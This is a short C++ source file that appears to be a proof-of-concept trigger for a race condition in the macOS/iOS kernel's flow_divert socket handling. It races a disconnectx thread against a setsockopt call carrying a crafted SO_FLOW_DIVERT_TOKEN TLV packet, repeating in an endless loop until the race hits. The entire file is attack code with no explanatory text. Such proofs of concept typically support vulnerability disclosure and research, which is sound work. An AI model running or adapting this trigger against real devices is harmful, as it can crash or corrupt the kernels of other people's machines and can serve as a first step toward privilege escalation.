// clang++ -std=c++11 -o flow_divert flow_divert.cc

#include <thread>
#include <sys/socket.h>
#include <unistd.h>

#define IPPROTO_TCP 6
#define FLOW_DIVERT_TLV_CTL_UNIT 10
#define FLOW_DIVERT_TLV_AGGREGATE_UNIT 26
#define SO_FLOW_DIVERT_TOKEN 0x1106

struct __attribute__((packed)) tlv0 {
  char type;
  uint32_t length;
};

struct __attribute__((packed)) tlv4 {
  char type;
  uint32_t length;
  uint32_t data;
};

struct __attribute__((packed)) flow_divert_packet {
  struct tlv0 control_unit;
  struct tlv4 aggregate_unit;
};

void do_one_attempt() {
  int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
  std::thread thread([sock]() { disconnectx(sock, 0, 0); });
  struct flow_divert_packet packet {
    .control_unit = {
      .type = FLOW_DIVERT_TLV_CTL_UNIT,
      .length = htonl(0),
    },
    .aggregate_unit = {
      .type = FLOW_DIVERT_TLV_AGGREGATE_UNIT,
      .length = htonl(4),
      .data = 0x41414141,
    }
  };
  setsockopt(sock, SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, &packet, sizeof(packet));
  thread.join();
  close(sock);
}

int main() {
  while (true) {
    do_one_attempt();
  }
  return 0;
}
